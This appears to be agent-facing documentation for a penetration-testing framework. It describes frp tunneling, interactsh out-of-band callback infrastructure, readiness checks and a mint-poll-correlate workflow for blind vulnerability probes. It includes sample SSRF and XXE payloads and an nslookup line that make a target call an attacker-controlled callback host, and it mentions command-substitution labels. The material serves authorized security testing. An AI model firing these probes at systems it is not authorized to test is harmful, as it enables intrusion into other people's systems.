---
description: "`vigil oob` frp/interactsh setup, per-agent OOB clients, tunnel logging, reverse shell and OOB DNS/HTTP callback conventions — paired with `agent/skills/exploit-playbook-authoring/SKILL.md` for playbook authoring conventions"
skill: exploit-playbook-authoring
---

# FRP Tunneling & OOB Callbacks

## Overview

frp exposes local runtime services to remote targets. interactsh records out-of-band callbacks
for blind SSRF, XXE, command injection, SQLi, Log4Shell-style probes, and similar tests.

FRP tunnels, listeners, and the OOB callback server are operator-controlled shared
infrastructure: agents leave the shared `frpc` / `oob-server` sessions alone because they are
global runtime state that other engagements depend on. Agents run their own readiness checks and
per-agent clients through `vigil oob`, so routine status and log checks stay out of the operator loop.

```text
Internet -> Caddy/TLS -> frps -> frpc in vigil -> interactsh or local listener
Internet -> frps TCP/UDP port -> frpc in vigil -> local runtime service
```

## Setup (operator)

Configuration (`vigil config set oob.*`, `vigil install` allocating the relay slot, `vigil oob
routing --format all` for the DNS/Caddy edge output) is in `docs/oob-routing.md` "Configuration"
and "The relay slot". There is no built-in host or domain; `oob.frp_host`, `oob.domain` and
`oob.frp_token` are required (port defaults to 7000), and `VIGIL_FRP_HOST`, `VIGIL_FRP_PORT`,
`VIGIL_FRP_TOKEN`, `VIGIL_OOB_DOMAIN` override config where allowed. A persisted tenant route
rejects a conflicting ambient OOB domain so callback correlation cannot move silently.

Outside the CLI:

- Delegate the OOB zone with an NS record such as `oob NS <frp-host>` whose value is the frp
  host's name, never a raw IP. The name tracks the frp host's address (its A record is kept
  current by the EC2→Route53 dynamic-DNS Lambda); a literal-IP NS breaks every interactsh client
  with `no address found for host` once that IP changes.
- Keep wildcard HTTP routing for the frp HTTP domain (`*.<frp-http-domain>`).
- Allow the frps bind port, OOB DNS UDP 53, HTTP/HTTPS, and any listener ports in the server
  security group.
- Keep the frp token in `vigil config`, out of tracked files.

## Starting Shared OOB Infrastructure

```bash
vigil oob start
vigil oob status --json
```

`vigil oob start` is idempotent: it renders runtime config under `/data/oob/`, starts missing tmux
sessions, and leaves healthy sessions alone.

| Session | Purpose |
|---------|---------|
| `frpc` | Shared frp tunnels |
| `oob-server` | interactsh-server watcher |
| `oob-client-<name>` | Per-agent or per-engagement interactsh-client |

| Path | Source | Purpose |
|------|--------|---------|
| `/data/oob/frpc.log` | frpc | Tunnel registration and reconnect events |
| `/data/oob/watch.log` | server watcher | frp IP changes and interactsh restarts |
| `/data/oob/server.log` | interactsh-server | Raw callback stream; noisy |
| `/data/oob/clients/<name>.log` | interactsh-client | Raw per-client tail (`vigil oob client logs`); infra debug only |

`vigil logs oob --lines 80` tails these from the host. `vigil oob clean` prunes artifacts of
stopped, idle clients (`--help` for the retention window and `--dry-run`).

## Agent OOB Readiness Check

Before sending blind payloads:

```bash
vigil oob status --json
vigil logs oob --lines 80
```

| Check | Ready signal | Meaning |
|-------|--------------|---------|
| `health` | `ok` | the overall gate (`degraded`/`down` make `vigil oob status` exit non-zero) |
| `server` | `true` | interactsh-server is available for callbacks |
| `frpc` | `true` | FRP tunnel registration is active |
| `clients` | contains your named client | the listener is up; `vigil oob poll --client <name>` can correlate hits |

If `health` is not `ok` (`server` or `frpc` false, or a relay-route or domain problem named in
`issues`), read `vigil logs oob --lines 80` and record a runtime issue in your handoff. Escalate to
the operator only for shared infrastructure, token, DNS, or authentication failures, which are
operator-owned controls.

## OOB Procedure (mint→poll→correlate)

Every OOB-callback technique (blind SSRF, XXE, blind SQLi, blind command injection, Log4Shell-style
probes, and similar) uses this one loop; other docs point here for it.

### 0. Readiness

Proceed only when `vigil oob status --json` reports `health=ok` (table above). Otherwise record a
runtime issue rather than repairing shared infrastructure yourself.

### 1. Start or reuse a named client

One named client per agent or task. Agents manage these directly because they are correlation
handles, not shared infrastructure:

```bash
vigil oob client list
vigil oob client start vuln-ssrf-api --engagement <engagement-key> --agent vulnerability-analyst
```

The client runs the listener; the callback URL and the hits come from `mint` and `poll`, not from
its log. Stop it when the task is done: `vigil oob client stop vuln-ssrf-api`.

### 2. Mint

Mint a nonce-tagged callback per payload and fire the exact host `mint` prints (`$OOB_HOST`):

```bash
vigil oob mint --client vuln-ssrf-api --technique ssrf --target-url <url> --param <p>
# → host  <nonce>.<client-id>.oob.example.com      ← this is $OOB_HOST
# → http  http://<nonce>.<client-id>.oob.example.com/
```

`mint` binds the nonce under the running client's interactsh id (it auto-selects the sole running
client; pass `--client <name>` when several run). interactsh delivers a callback to a client's
poll only when the host carries that client's id, so a hand-built `<nonce>.oob.example.com` lands
only in the raw server log where `poll` never sees it. Substitute `$OOB_HOST` verbatim.

### 3. Fire

```text
http://$OOB_HOST/ssrf-users-endpoint
nslookup $OOB_HOST
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://$OOB_HOST/xxe">]>
```

### 4. Poll with the same client you minted under

```bash
vigil oob poll --client vuln-ssrf-api
```

The nonce is bound to the minting client's interactsh id, so polling another client misses the
hit. `poll` prints `matched <N> unmatched <M>` and one line per correlated hit carrying the
technique and target you minted with, so a matched pair documents itself. Add `--json` to capture
the matched set as evidence.

### 5. Raw logs are for infra debugging

`vigil oob client logs <name> --lines 80` and `vigil logs oob --lines 80` show whether the listener
is up and anything is arriving. Deciding whether a probe hit is `vigil oob poll --client <name>`
only, because only `poll` attributes a callback to the probe that minted it.

### What a callback proves, and hosted payloads

A matched callback proves the target (or something acting on its input) made a request: it
proves the primitive, not impact. Feature lookups (ping or DNS-check tools), mail and link
scanners, and third-party tool egress all produce bare-host hits. Execution classes need the
callback to carry an evaluated label (`$(whoami)`, `49`); SSRF impact needs internal data or a
privileged follow-on (`agent/rules/hunting.md` §2). An empty `matched` while `health=ok` is a
target result (no egress, no execution), not a runtime issue.

The interactsh server records requests but serves no content. When the target must fetch
attacker content (an external DTD for blind XXE, an RFI payload, a JWKS for `jku`), that needs a
listener exposed through frp, which the operator provisions (`agent/shared-constraints.md` §2a,
§12: read `$DIR/.listener_url`; without it, record a blocked technique).

### Fallback

If OOB is unavailable, fall back to time-based detection (sleep payloads) and state in your output
that OOB proof was not available. If time-based detection also fails and OOB proof would have been
decisive, record a runtime issue that shared OOB infrastructure was unavailable, so the technique
stays visible as blocked rather than silently dropped.

## Validation

`vigil oob test` smoke-tests the shared infrastructure after start; `dig test123.oob.example.com
@8.8.8.8`, `curl http://test123.oob.example.com/` and `vigil logs oob --lines 40` check it by
hand. Both prove reachability only; per-payload confirmation is the mint→poll→correlate loop above.

## Notes

- DNS uses UDP. The frp DNS proxy must stay UDP port 53.
- HTTP tunnels go through Caddy/TLS and frps HTTP routing; TCP/UDP tunnels bypass Caddy and bind
  direct ports on frps.
- Proxy names must be globally unique across active frpc clients; `vigil oob start` prefixes names
  with the runtime container hostname.
- `/data/oob/` persists through the runtime data volume.
